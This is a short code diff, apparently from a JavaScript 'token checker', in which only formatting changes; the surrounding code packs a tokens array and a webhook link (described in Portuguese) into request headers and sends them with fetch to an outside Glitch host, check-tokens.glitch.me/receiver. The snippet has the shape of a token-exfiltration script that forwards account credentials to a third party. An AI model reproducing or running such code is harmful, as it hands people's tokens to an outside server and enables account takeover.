@@ -10,9 +10,9 @@ const tokens = [
 const webhook = 'link completo do webhook para receber as informações da token';
 
 fetch(`https://check-tokens.glitch.me/receiver`, {
-		method: 'GET',
-		headers: {
-			authorization: tokens,
-			webhook: webhook
-		}
-})
+	method: 'GET',
+	headers: {
+		authorization: tokens,
+		webhook: webhook
+	}
+});
